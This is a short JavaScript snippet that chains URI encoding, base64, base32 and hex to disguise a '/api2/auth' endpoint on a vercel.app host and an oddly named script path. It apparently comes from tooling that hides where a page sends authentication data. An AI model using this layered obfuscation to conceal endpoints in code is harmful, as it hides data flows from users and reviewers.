
const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
const cascadeEncode = (data) => {
    let s1 = encodeURIComponent(data);
    let s2 = Buffer.from(s1, 'utf8').toString('base64');
    let binary = "";
    for (let i = 0; i < s2.length; i++) {
        let bin = s2.charCodeAt(i).toString(2);
        binary += "0".repeat(8 - bin.length) + bin;
    }
    let s3 = "";
    for (let i = 0; i < binary.length; i += 5) {
        let chunk = binary.substr(i, 5);
        if (chunk.length < 5) chunk += "0".repeat(5 - chunk.length);
        s3 += alphabet[parseInt(chunk, 2)];
    }
    let s4 = "";
    for (let i = 0; i < s3.length; i++) s4 += s3.charCodeAt(i).toString(16).padStart(2, '0');
    return s4;
};

console.log(`API_URL: ${cascadeEncode("https://relais-kappa.vercel.app/api2/auth")}`);
console.log(`JS_PATH: ${cascadeEncode("assets/js/j7x2w.js")}`);
